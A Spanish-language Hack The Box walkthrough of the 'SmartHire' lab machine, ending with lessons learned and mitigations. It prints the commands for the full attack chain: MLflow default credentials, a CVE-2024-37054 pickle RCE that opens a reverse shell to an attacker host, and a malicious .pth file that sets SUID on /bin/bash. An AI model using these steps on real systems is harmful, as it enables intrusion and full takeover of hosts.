---
title: "HTB Walkthrough: SmartHire"
date: 2026-09-26
draft: false
description: "Walkthrough completo de la máquina SmartHire de Hack The Box. Dificultad Media, Linux. Descubrimiento de vhost oculto (models.smarthire.htb) → credenciales por defecto de MLflow → RCE por deserialización insegura de modelos (CVE-2024-37054) → shell como svcweb → escalada a root por inyección de fichero .pth en site.addsitedir() ejecutado por sudo."
tags: ["HackTheBox", "Linux", "Medium", "MLflow", "CVE-2024-37054", "RCE", "Deserialization", "VhostFuzzing", "PthInjection", "SudoPrivesc", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **SmartHire** en Hack The Box. Máquina de dificultad **Media** con **Linux**. Fuzzing de subdominios descubre un vhost oculto (`models.smarthire.htb`) que sirve una instancia de **MLflow** protegida con credenciales por defecto (`admin:password`). La versión MLflow 2.14.1 es vulnerable a **CVE-2024-37054**: subimos una versión maliciosa de un modelo registrado — un `model.pkl` con `__reduce__` que dispara una reverse shell — y la aplicación la ejecuta al cargarla para predicciones. Desde la shell como `svcweb`, `sudo -l` revela que se puede ejecutar `mlflowctl.py` como root; el script llama a `site.addsitedir()` sobre un directorio de plugins **escribible por nuestro grupo**, lo que permite plantar un fichero `.pth` que se ejecuta como root.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                                              |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | SmartHire                                                                                                                                            |
| **SO**         | Linux                                                                                                                                                |
| **Dificultad** | Media                                                                                                                                                |
| **IP**         | 10.129.245.215                                                                                                                                       |
| **Técnicas**   | Fuzzing de vhosts · Credenciales por defecto MLflow · CVE-2024-37054 RCE (pickle) · Inyección `.pth` en `site.addsitedir()` vía `sudo` NOPASSWD    |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.245.215
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
echo "10.129.245.215 smarthire.htb" >> /etc/hosts
```

### 1.2 Enumeración de Directorios

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
  -u http://smarthire.htb/FUZZ
```

```
login       [Status: 200, Size: 6160]
register    [Status: 200, Size: 6499]
logout      [Status: 302, Size: 199]
dashboard   [Status: 302, Size: 199]
```

> **💡 Hallazgo clave:** la aplicación tiene **registro de usuarios propio** — no hacen falta credenciales filtradas para interactuar con ella como usuario autenticado.

### 1.3 Fuzzing de Subdominios (vhosts)

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://smarthire.htb/ -H "Host: FUZZ.smarthire.htb" -fc 301,302
```

```
models      [Status: 401, Size: 137, Words: 11, Lines: 1, Duration: 60ms]
```

> **💡 Superficie de ataque:** el vhost `models.smarthire.htb` responde con un reto de autenticación básica HTTP. La respuesta `401` (en lugar del redireccionamiento genérico del host principal) confirma que este subdominio existe y tiene su propio backend.

---

## 2. Acceso a MLflow — Credenciales por Defecto

`models.smarthire.htb` sirve una instancia de **MLflow**. Las credenciales por defecto son públicamente conocidas:

```bash
curl -s -u admin:password http://models.smarthire.htb/ | head -5
```

```
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>MLflow</title>
```

> **⚠️ Credenciales por defecto:** `admin:password` es válido — acceso completo a la UI y a la API REST de MLflow sin más esfuerzo. La versión identificada en la interfaz es **MLflow 2.14.1**, vulnerable a **CVE-2024-37054** (RCE por deserialización insegura de modelos).

---

## 3. Explotación — CVE-2024-37054 (RCE por Deserialización de Modelos MLflow)

MLflow 2.14.1 serializa los modelos usando `pickle`. Al cargar un modelo para inferencia, deserializa el `model.pkl` sin validación, lo que permite ejecutar código arbitrario.

### 3.1 Registrarse y Crear un Modelo Legítimo

Primero creamos una cuenta en la aplicación principal y subimos datos de entrenamiento para que genere un modelo registrado en MLflow:

```bash
curl -c cookies.txt -X POST http://smarthire.htb/register \
  -d "username=testuser1&company=testcorp1&password=Password123"

curl -b cookies.txt -c cookies.txt -X POST http://smarthire.htb/login \
  -d "username=testuser1&password=Password123"

echo -e "years_experience,education_level,hired\n1,1,0\n5,2,1\n3,1,0" > train.csv
curl -b cookies.txt -X POST http://smarthire.htb/upload_hiring_data -F "file=@train.csv"
```

```json
{"message":"Model trained and registered successfully","registered_model":"testcorp1-1cd45f83431b-model","status":"success"}
```

> **💡 Por qué este paso:** necesitamos un modelo **ya registrado** en MLflow con nuestro nombre para poder subir una nueva versión maliciosa. La aplicación, al recibir una petición `/predict`, cargará la versión en `Production` — que será la nuestra.

### 3.2 Registrar una Versión Maliciosa del Modelo

Con el listener activo:

```bash
nc -lvnp 4444
```

Ejecutamos el PoC público:

```bash
python3 mlflow_pickle_rce.py \
  --mlflow http://models.smarthire.htb \
  --model-name "testcorp1-1cd45f83431b-model" \
  --lhost 10.10.15.193 --lport 4444
```

```
[+] Model 'testcorp1-1cd45f83431b-model' already exists, reusing it
[+] MLmodel upload: 200
[+] model.pkl upload: 200
[+] Stage transition to 'Production': 200
[*] Now trigger whatever loads this model version in the target app
```

```
Normal flow:    mlflow.pyfunc.load_model() carga model.pkl → instancia de predictor legítimo
Flujo malicioso: model.pkl manipulado con __reduce__ → durante la deserialización, pickle ejecuta
                 os.system("reverse shell") → conexión saliente → shell como svcweb
```

### 3.3 Disparar la Carga del Modelo Malicioso

```bash
echo -e "experience,skills\n3,Python" > resume.csv
curl -b cookies.txt -X POST http://smarthire.htb/predict -F "file=@resume.csv"
```

La aplicación invoca `mlflow.pyfunc.load_model()` sobre la versión en `Production` — la nuestra — y dispara la reverse shell.

### 3.4 Estabilizar la Shell

```
Listening on 0.0.0.0 4444
Connection received on 10.129.245.215 53584
whoami
svcweb
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## 4. User Flag

```bash
cat /home/svcweb/user.txt
```

> 🔑 User flag obtenida.

---

## 5. Enumeración de Privilegios

### 5.1 Comprobación de `sudo`

```bash
sudo -l
```

```
User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

### 5.2 Análisis de `mlflowctl.py`

```python
from pathlib import Path
import sys
import site

BASE_DIR = Path(__file__).resolve().parent
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))      # <-- se ejecuta antes de leer los argumentos

def main():
    import mlflow_actions, backup_models
    action = sys.argv[1]
    if action == "status":
        mlflow_actions.check_status()
    elif action == "backup-models":
        backup_models.run()
    elif action == "restart":
        mlflow_actions.restart()

if __name__ == "__main__":
    main()
```

> **⚠️ Vulnerabilidad identificada:** el script llama a `site.addsitedir()` sobre **todos** los subdirectorios de `plugins/` **antes de comprobar qué acción se pidió**. `site.addsitedir()` no solo añade el directorio al path de importación: también **procesa cualquier fichero `.pth`** que encuentre allí. En un `.pth`, cualquier línea que empiece por `import` se **ejecuta como código Python** durante ese procesado — y aquí se ejecuta como **root**.

### 5.3 Permisos del Directorio de Plugins

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x 3 root root 4096  core
drwxrwxr-x 2 root devs 4096  dev
```

> **💡 Hallazgo clave:** `plugins/dev/` es **escribible por el grupo `devs`**, al que pertenece `svcweb`. No hace falta tocar `plugins/core/` — basta con plantar un `.pth` en el directorio que ya controlamos.

---

## 6. Escalada de Privilegios — Inyección de `.pth` vía `site.addsitedir()`

### 6.1 Plantar el Fichero `.pth` Malicioso

```bash
echo 'import os; os.system("chmod +s /bin/bash")' \
  > /opt/tools/mlflow_ctl/plugins/dev/pwn.pth
```

### 6.2 Ejecutar el Script con `sudo`

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

```
[*] Checking MLflow service status...
[+] MLflow service status: active
```

El script termina "con normalidad" — pero `site.addsitedir()` ya procesó `pwn.pth` como **root** antes de llegar al `main()`.

### 6.3 Usar el Binario SUID

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

```bash
/bin/bash -p
bash-5.1# whoami
root
```

```
Flujo normal:    site.addsitedir() añade el directorio al sys.path → importa módulos legítimos
Flujo malicioso: .pth plantado en directorio escribible → site.addsitedir() ejecuta "import os; os.system(...)"
                 → como root → chmod +s /bin/bash → /bin/bash -p → EUID 0
```

---

## 7. Root Flag

```bash
cat /root/root.txt
```

> 🏁 Root flag obtenida.

---

## 8. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap revela puertos 22/80. Fuzzing de directorios confirma portal con registro propio. Fuzzing de vhosts descubre `models.smarthire.htb` (401).
2. **Credenciales por defecto** → `admin:password` válido en MLflow → acceso completo a la UI/API. Versión identificada: MLflow 2.14.1 (CVE-2024-37054).
3. **Modelo legítimo** → registro en `smarthire.htb` + `/upload_hiring_data` → modelo `testcorp1-...-model` creado en MLflow.
4. **CVE-2024-37054** → `mlflow_pickle_rce.py` sube versión maliciosa del modelo (pickle con `__reduce__`) promovida a `Production`.
5. **RCE** → `/predict` con CSV válido → `mlflow.pyfunc.load_model()` deserializa `model.pkl` → reverse shell como `svcweb`.
6. **User flag** → `/home/svcweb/user.txt`.
7. **sudo** → `NOPASSWD: mlflowctl.py *` como root → script llama `site.addsitedir()` sobre `plugins/dev/` (escribible por grupo `devs`).
8. **`.pth` injection** → `pwn.pth` con `import os; os.system("chmod +s /bin/bash")` → `sudo mlflowctl.py status` → `bash -p` → root.

**Qué aprendí de esta máquina:**

- **`site.addsitedir()` sobre directorios no controlados exclusivamente por root es una escalada de privilegios.** Los ficheros `.pth` no son solo entradas de path — cualquier línea `import ...` en ellos se ejecuta como código Python durante el procesado. Si el directorio es escribible por un usuario de menor privilegio y el script se ejecuta como root, es ejecución de código arbitraria.

- **Los paneles de administración de servicios internos con credenciales por defecto son un vector frecuente.** MLflow, Jupyter, Airflow, Grafana y muchos otros tienen credenciales de fábrica bien documentadas. Un servicio interno accesible (aunque sea detrás de auth básica) con credenciales por defecto es equivalente a un servicio abierto para un atacante con acceso de red.

- **CVE-2024-37054 demuestra que la carga de modelos ML desde fuentes no confiables es RCE.** `pickle` ejecuta código arbitrario durante la deserialización — por diseño del protocolo. Los sistemas de ML que cargan modelos sin verificar su procedencia son vectores de ataque inherentes. La defensa requiere firmado de artefactos y entornos de inferencia aislados.

- **El fuzzing de vhosts es obligatorio en cualquier enumeración web.** Un host que devuelve 301/302 genérico puede tener vhosts con superficies completamente distintas detrás del mismo IP. `ffuf` con `-fc 301,302` filtra el ruido y expone los vhosts reales.

- **Las reglas `sudo` NOPASSWD sobre scripts que cargan código de rutas dinámicas son difíciles de asegurar.** Incluso si el script en sí es "seguro", cualquier directorio que procese mediante `import`, `site.addsitedir()`, o rutas en `sys.path` convierte la regla en una escalada potencial si esa ruta es escribible por el usuario privilegiado con `sudo`.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Vhost oculto descubierto por fuzzing | Devolver respuestas idénticas para vhosts no configurados; aplicar *rate limiting* en el proxy inverso |
| Credenciales por defecto de MLflow (`admin:password`) | Cambiar credenciales antes de cualquier despliegue; nunca exponer paneles de administración con credenciales de fábrica |
| CVE-2024-37054 — RCE por deserialización de modelos en MLflow 2.14.1 | Actualizar MLflow a versión parcheada; restringir quién puede registrar/promover versiones de modelos; cargar modelos en entorno aislado |
| Aplicación que carga automáticamente la versión "Production" sin validar procedencia | Firmar y verificar artefactos de modelo antes de cargarlos; separar entorno de registro del de inferencia |
| `sudo` NOPASSWD sobre script que llama `site.addsitedir()` en directorio escribible | Nunca ejecutar como root código que procese rutas escribibles por usuarios de menor privilegio; eliminar reglas `sudo` sobre scripts de carga dinámica |
| Directorio `plugins/dev/` escribible por grupo `devs` | Aplicar permisos de solo lectura para cualquier ruta procesada con privilegios elevados; separar directorios de desarrollo de los de ejecución privilegiada |
